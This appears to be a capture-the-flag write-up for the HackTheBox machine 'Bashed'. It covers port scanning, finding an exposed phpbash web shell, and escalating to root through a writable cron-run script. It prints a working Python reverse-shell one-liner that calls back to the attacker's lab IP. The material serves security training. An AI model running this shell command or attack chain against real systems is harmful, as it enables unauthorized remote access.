---
layout: page
title: Bashed - HackTheBox
permalink: /posts/ctf/hackthebox/bashed.html
---

# Debug - CyberSecLabs
----


First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 10.10.10.68`

![image](https://user-images.githubusercontent.com/50459517/109188821-ef447300-7758-11eb-8b6a-224f7a66cb21.png)

Looks like we only have one port open, lets check out the web server.

![image](https://user-images.githubusercontent.com/50459517/109188858-fa979e80-7758-11eb-8809-71336dcbdabb.png)

phpbash.. interesting.  Looking into this it looks like its an open source project for interacting with the server via a web-shell.  I enumerated for directories using dirsearch to see if I could find the file.

![image](https://user-images.githubusercontent.com/50459517/109188898-071bf700-7759-11eb-97f4-d13a9fa78196.png)

After checking out these directories, I found that the **/dev/** directory has the **phpbash.php** file.

![image](https://user-images.githubusercontent.com/50459517/109188937-100cc880-7759-11eb-876c-7fe736edb734.png)

![image](https://user-images.githubusercontent.com/50459517/109188962-18fd9a00-7759-11eb-8092-23bfa8fc16cf.png)

Looks like it works, now lets try to get a reverse shell connected to our local machine so we can get an interactive shell.

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

![image](https://user-images.githubusercontent.com/50459517/109189039-2fa3f100-7759-11eb-8c8a-1445f47165f7.png)

Now that we have an interactive shell, lets copy LinPEAS over and see what we find

![image](https://user-images.githubusercontent.com/50459517/109189066-3894c280-7759-11eb-8578-0aae8c409230.png)

Looks like we can run any command as **scriptmanager** with no password, so lets run **/bin/bash** to get a shell as this user.

![image](https://user-images.githubusercontent.com/50459517/109189106-40ecfd80-7759-11eb-8c56-91a9ae365b3c.png)

Now that we are the **scriptmanager** user, we can enumerate the machine to see if we can escalate to root.  After some digging we find a directory called **scripts** that has the following files.

![image](https://user-images.githubusercontent.com/50459517/109189133-4a766580-7759-11eb-8be0-2e8809e25daa.png)

Looking at the source code of **[test.py](http://test.py)**, I see that it simply opens the file **test.txt** and writes some data in it.  However **test.txt** is owned by root, so even though we are the owner of the script, we need to run this as root to actually write to the file.  However after a few minutes we notice that the **test.txt** file has a new "last modified" time on it, indicating that we have a cron job executing the **test.py** script.

![image](https://user-images.githubusercontent.com/50459517/109189159-55c99100-7759-11eb-99a8-1f0d542d68f2.png)

Since we have write access to this file, we can modify the file to connect to our local machine.  Since this script is being run as root, we should get a shell back as root.

![image](https://user-images.githubusercontent.com/50459517/109189193-5eba6280-7759-11eb-8602-7602e7ae81c5.png)

![image](https://user-images.githubusercontent.com/50459517/109189220-667a0700-7759-11eb-8265-3d81741bd771.png)
